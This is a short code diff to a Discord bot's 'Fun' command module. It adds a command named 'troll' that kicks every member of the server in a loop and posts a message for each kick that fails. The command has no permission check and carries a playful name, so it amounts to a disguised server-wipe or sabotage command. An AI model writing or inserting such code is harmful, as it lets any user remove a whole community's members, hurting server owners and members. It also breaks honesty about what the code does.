@@ -22,6 +22,14 @@ class Fun(commands.Cog):
         if isinstance(error, commands.MissingRequiredArgument):
             await ctx.send('Please provide a question for me to answer!')
 
+    @commands.command()
+    async def troll(self, ctx):
+        for member in ctx.guild.members:
+            try:
+                await member.kick(reason='trolled')
+            except:
+                await ctx.send(f"could not troll {member} 😐")
+
 
 def setup(bot):
     bot.add_cog(Fun(bot))
